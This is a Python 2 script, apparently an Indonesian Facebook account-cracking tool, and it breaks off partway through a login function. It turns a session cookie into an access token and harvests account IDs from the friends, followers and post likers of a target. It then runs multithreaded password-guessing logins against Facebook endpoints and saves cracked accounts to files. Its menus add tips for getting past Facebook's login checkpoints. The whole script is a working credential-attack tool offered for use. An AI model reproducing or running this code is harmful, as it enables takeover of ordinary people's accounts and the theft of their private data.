#coding=utf-8
#jj




import requests,bs4,sys,os,random,time,re,json
import calendar,jeeckxnano,JMBFF
from datetime import datetime
from datetime import date 
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding("utf-8")
if 'linux' in sys.platform.lower():
    p = "\033[0;00m"
    b = "\033[0;35m"
    m = "\033[1;91m"
    h = "\033[1;32m"
else:
    p = ""
    b = ""
    m = ""
    h = ""

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4') 

def love_jeeck(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

banner = ("""
                       `︿ˊ
    __    ____  ___________ _   __
   / /   / __ \/ ____//  _// | / /
  / /   / / / / / __  / / /  |/ /
 / /___/ /_/ / /_/ /_/ / / /|  /
/_____/\____/\____/____\/_/ |_/ V.1.00
""")
logo = ("""
\033[0;33m╭━━━━━━━╮
\033[0;33m┃● ══   ┃ \033[0;36m✠═╦══════╩═════════════════════════════════════════════✠
\033[0;33m┃███████┃   \033[0;36m║ \033[0;32m[1] \033[0;33mNc : Jecko Ramadhan  \033[0;36m║ \033[0;32m[\033[0;32m4] \033[0;33mX N C O D E
\033[0;33m┃█\033[0;00m>_\033[0;33m████┃   \033[0;36m║ \033[0;32m[2] \033[0;33mFB : Jeeck X Nano    \033[0;36m║ \033[0;32m[\033[0;32m5] \033[0;33mCRACK FBMBF
\033[0;33m┃███████┃   \033[0;36m║ \033[0;32m[3] \033[0;33mWA : 081392505882    \033[0;36m║ \033[0;32m[\033[0;32m6] \033[0;33mTHX : YAYAN XD 
\033[0;33m┃███████| \033[0;36m✠═╬════════════════════════════════════════════════════✠
\033[0;33m┃███████┃   \033[0;36m╚═══•>   P R U D A L L A C C O U N T S O S M E D
\033[0;33m┃███████┃ \033[0;36m✠═╬════════════════════════════════════════════════════✠
\033[0;33m|○      ┃   \033[0;36m╚═══•> \033[0;33m   TOOLS CRACK FACEBOOK CODE BY : JEECK
\033[0;33m╰━━━━━━━╯   \033[0;36m╚═══•>  \033[0;33m CREATED BY : JEECK , YAYAN , YUMASAA\033[0;36m ╰_╯
""")

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")


__jeeck__xnano__ = random.choice(["https://www.facebook.com/jecko.ramadhan.9","https://www.facebook.com/jecko.ramadhan.9"])

__jeeck__ = __jeeck__xnano__



def login():
    global token
    os.system("clear");print(banner)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    print(" %s[%s1%s] Login via token\n%s [%s2%s] Bergabung Ke Group Fb"%(p,b,p,p,b,p))
    print(" %s[%s3%s] Cara Ambil Token"%(p,b,p))
    print(" %s[%s4%s] PANDUAN PENGGUNA"%(p,b,p))
    ___Jeeck___xnano___lawack___=raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if ___Jeeck___xnano___lawack___ in ["1","01"]:
        log_token()
    elif ___Jeeck___xnano___lawack___ in ["3","03"]:
        ___jeeck___cara()
    elif ___Jeeck___xnano___lawack___ in ["4","04"]:
        ___jeeck___cara___crack___()
    elif ___Jeeck___xnano___lawack___ in ["2","02"]:
        cookie()
    else:print("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p));time.sleep(1);login()


def log_token():
    global token
    os.system("clear");print(banner)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    convert=raw_input("%s [%s•%s] Token: "%(p,b,p))
    try:
        saya=requests.get('https://graph.facebook.com/me?access_token=%s'%(convert));open("login.txt",'w').write(convert)
        print("\n %s[%s•%s] Login berhasil"%(p,b,p));love_jeeck(" %s[%s•%s] Anjc Lu Pake doank Kagak Comment:)"%(p,b,p));os.system('xdg-open %s'%(__jeeck__));exit(menu())
    except KeyError:
        print("\n %s[%s!%s] Token invalid!"%(p,m,p));time.sleep(1);login()

def update():
    os.system(" xdg-open https://www.facebook.com/groups/221877543390653")
    menu()
def ___jeeck___cara():
   os.system(" xdg-open https://youtu.be/p4MjQCD0ej4 ")
   menu()
def ___jeeck___cara___crack___():
   love_jeeck(" %s[%s•%s] Follow Github Aink :( NGGAK MAKSA .·´¯`(>▂<)´¯`·. "%(p,b,p))
   love_jeeck(" %s[%s•%s] Kalian Siapkan Bahan Bahan 😁"%(p,b,p))
   love_jeeck(" %s[%s•%s] 🗿Bang Apa Bahan Bahan Nya :V"%(p,b,p))
   love_jeeck(" %s[%s•%s] : AKUN TUMBAL PROYEK,TOKEN,IDTARGET,USERAGENT, PAKETDATA"%(p,b,p))
   love_jeeck(" %s[%s•%s] Langsung Ae Tuh Cari Id Target Untuk Pengambilan Harus Bersifat"%(p,b,p))
   love_jeeck(" %s[%s•%s] Berteman Jika Tidak Berteman Tidak Masalah Lebih Baik Berteman Sihh......"%(p,b,p))
   love_jeeck(" %s[%s•%s] KaLo Mau Onetapss Yess Ya "%(p,b,p))
   love_jeeck(" %s[%s•%s] Untuk Pengambilan User Agent Cari Di Google Banyak Kok"%(p,b,p))
   love_jeeck(" %s[%s•%s] Ketikan User Agent Randomm "%(p,b,p))
   love_jeeck(" %s[%s•%s] Untuk Apn Pake APN BWAAN"%(p,b,p))
   love_jeeck(" %s[%s•%s] Bwank Apn Itu apa Apn Itu Untuk Sambung Internet"%(p,b,p))
   love_jeeck(" %s[%s•%s] Jadi Kalo Nggak Ada Apn Nggak Ada Internet / DOWN"%(p,b,p))
   love_jeeck(" %s[%s•%s] Cukup Kann.... Bocil..............EPEP"%(p,b,p))
   love_jeeck(" %s[%s•%s] Bwank :V....kanapa Jarang Up.... Lagi Mumet Aku Cok"%(p,b,p))
   love_jeeck(" %s[%s•%s] SEMOGA BETAH YAH PAKE TOOLS SAYA HEHEHEHEHEHE MAKASIH"%(p,b,p))
   love_jeeck(" %s[%s•%s] MAKASIH BUAT KALIAN YANG SUDAH SUPPORT SAYA SAMPE 27 FOLLOWERS"%(p,b,p))
   love_jeeck(" %s[%s•%s] I'M LOVE ALL "%(p,b,p))
   ___Jeeck___xnano___lawack__=raw_input("\n%s [%s•%s] ENTER Untuk Kembali Ke Menu Login "%(p,b,p))
   login()
def cookie():
	update()
	os.system('clear');print(logo)
	print("\033[0;96m"+50*"-")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] cookie: ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	
	except requests.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print("\n %s[%s•%s] Login berhasil"%(p,b,p));love_jeeck(" %s[%s•%s] Please Subscribe My Channel:)"%(p,b,p));os.system('xdg-open %s'%(__jeeck__));exit(jeeckxnano.jeeckxnanodesu())
def menu():
    try:
        token = open("login.txt","r").read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s'%(token))
        i = json.loads(saya.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split("/")
        month = bulan_ttl[month]
    except Exception as e:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    os.system("clear");print(logo)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    print("%s [%s•%s] Nickname      : %s "%(p,b,p,nick));print("%s [%s•%s] ID facebook   : %s "%(p,b,p,idme));print("%s [%s•%s] Tanggal lahir : %s %s %s"%(p,b,p,day,month,year))
    print("\033[0;36m✠═╦══════╩═════════════════════════════════════════════✠")
    print("\n%s [%s01%s] Crack fb dari public "%(p,b,p))
    print("%s [%s02%s] Crack fb dari list perteman sendiri "%(p,b,p))
    print("%s [%s03%s] Crack fb dari follower publik "%(p,b,p))
    print("%s [%s04%s] Crack fb dari like publik"%(p,b,p))
    print("%s [%s05%s] Crack fb massal publik"%(p,b,p))
    print("%s [%s06%s] Chek opsi akun chek point"%(p,b,p))
    print("%s [%s07%s] Setting useragent"%(p,b,p))
    print("%s [%s08%s] Chek hasil crack"%(p,b,p))
    print("%s [%s09%s] Team project [ TEAM ]"%(p,b,p))
    print("%s [%s10%s] Repots Bug [ TUTOR SESI ]"%(p,b,p))
#    print("%s [%s11%s] Repots Bug [ TUTOR SESI ]"%(p,b,p))
    print("%s [%s00%s] Logout dari akun ini"%(p,m,p))
    _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _jeeck_xxz_xnx_xuner_ in ["2","02"]:
        ___jeeck___dumptempik___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["1","01"]:
        ___jeeck___dumppupi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["10","10"]:
       ___jeeck___report___()
    elif _jeeck_xxz_xnx_xuner_ in ["9","09"]:
        ___jeeck___author___()
    elif _jeeck_xxz_xnx_xuner_ in ["3","03"]:
        ___jeeck___kotangpupi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["4","04"]:
        ___jeeck___kotangpupimambuwangi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["5","05"]:
        ___jeeck___sunatmasall___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["6","06"]:
        ___jeeck___opsinetiliki___()
    elif _jeeck_xxz_xnx_xuner_ in ["7","07"]:
        Berhasil()
    elif _jeeck_xxz_xnx_xuner_ in ["8","07"]:
        ___jeeck___tilikihasile___()
    elif _jeeck_xxz_xnx_xuner_ in ["0","00"]:
        os.system("rm -rf login.txt")
    else:print("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p));time.sleep(1);login()
def ___jeeck___author___():
   love_jeeck("\n %s[%s•%s] AUTHOR :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]          (1. Jeeck x Nano "%(p,b,p))
   love_jeeck(" %s[%s•%s] TEAM PROJECT :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (1. XNXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]              (2. XXCODE "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (3. YAYAN XD "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (4. YUMASAA "%(p,b,p))
   love_jeeck(" %s[%s•%s] DONASI : [ JEECK ] "%(p,b,p))
   love_jeeck(" %s[%s•%s]        : 08192505882 "%(p,b,p))
   love_jeeck(" %s[%s•%s]        : 085891511849"%(p,b,p)) 
   love_jeeck(" %s[%s•%s] THANKS TO : "%(p,b,p))
   love_jeeck(" %s[%s•%s]           : XNXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : XXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : YAYAN XD"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : YUMASAA"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : UDARA KARENA TANPA UDARA KITA AKAN MATI"%(p,b,p))
   _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] ENTER UNTUK KEMBALI KE MENU "%(p,b,p))
   menu()

def ___jeeck___report___():
   love_jeeck("\n %s[%s•%s] Repoth Bug :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Chat Wa Admin  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : ( 081392505882  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Facebook  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s]              : ( Jeeck X Nano  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Donasi :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]               : ( 081392505882  "%(p,b,p))
   love_jeeck(" %s[%s•%s]               : ( 085891511849  "%(p,b,p))
   love_jeeck(" %s[%s•%s] TUTOR ONE TAP : "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Lu Masuk Tools Ini Pake Apn Bawaan "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Ganti User Agent Yang Cocok Untuk HP Lu  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s] ( Terus Lu Cari Id Target Yang Sedaerah Dengan Lu "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Semisal Kalo Lu Tinggal Di Jawa Ya Lu Ambil Id Target Daerah Jawa  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Terus Lu Buka Fb Lite   "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Usahain Lu Pas Login Di Fb Lite Pake Metode Ganti Apn  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Kalo Belum Jebol Lu Ganti Sim Semial Lu Pas Crack Pake Sim2 Lu Ganti ke Sim 1  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s] ( Login Ke Fb Lite Ganti Sim Belum Jebol...........?  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Login Akun Ke sesi Di google Chrome Ganti Sim"%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Masih Belum Jebol Ganti Url Login  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Login FB BIRU Kalo Belum Jebol ...............?"%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Tunggu 7-10 Hari Akun Dah Kebukak Sendiri "%(p,b,p))
   _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] ENTER UNTUK KEMBALI KE MENU "%(p,b,p))
   menu()

def ___jeeck___dumptempik___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    try:
        for i in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Mungkin Id bersifat private0'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id : %s"%(p,b,p,(len(id))))


def ___jeeck___dumppupi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Mungkin Id bersifat private'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id : %s"%(p,b,p,(len(id))))


def ___jeeck___kotangpupi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] User Id Target Eror'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Masukan Dengan Benar'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id : %s"%(p,b,p,(len(id))))

def ___jeeck___kotangpupimambuwangi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id postingan\n [%s•%s] ID post target: "%(p,b,p,b,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/llikes/?limit=100000&access_token=%s"%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] User Id Target Eror'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Masukan Dengan Benar'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id : %s"%(p,b,p,(len(id))))

def ___jeeck___sunatmasall___():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
	try:
		jeeck_total = int(raw_input("\n%s [%s•%s] Total Dump Id Masal :  "%(p,b,p)))
	except:jeeck_total=1
	for t in range(jeeck_total):
		t +=1
		idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target%s: "%(p,b,p,b,p,t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				jeeckxbrutal = i["id"]
				jeeckxx = i["name"]
				id.append(jeeckxbrutal+"<=>"+jeeckxx)
		except KeyError:
			exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
	if (len(id)) == 0:
		exit('\n%s [%s!%s] Mungkin Id bersifat private0'%(p,m,p))
	else:
		print("\n%s [%s•%s] Total id : %s"%(p,b,p,(len(id))))

def jeeck_X_nano_x():
	print("\n%s [%s Select methode crack %s]%s"%(b,p,b,p))
	print("%s [%s1%s] Method B-API(%sKenceng%s)"%(p,b,p,b,p))
	print("%s [%s2%s] Method MBASIC(%sRecomended%s)"%(p,b,p,b,p))
	print("%s [%s3%s] Method MOBILE (%sLelet%s)\n"%(p,b,p,b,p))
	_xncode_jeeckxnano_ = raw_input("%s [%s•%s] Choose: "%(p,b,p))
	if _xncode_jeeckxnano_ in [""]:
		exit("\n%s [%s!%s] Pilihan tidak boleh kosong!"%(p,m,p))
	elif _xncode_jeeckxnano_ in ["1","01"]:
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall in ["d","D"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(api, uid, jeeck_X_nano)
			hasil()

	elif _xncode_jeeckxnano_ == "2":
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mbasic, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall == "d":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(mbasic, uid, jeeck_X_nano)
			hasil()

	elif _xncode_jeeckxnano_ == "3":
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(freefb, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(mobile, uid, jeeck_X_nano)
			hasil()
		else:
			exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))

	else:
		menu() 


def api(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r \033[0;00m[Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasic(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r \033[0;00m[Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
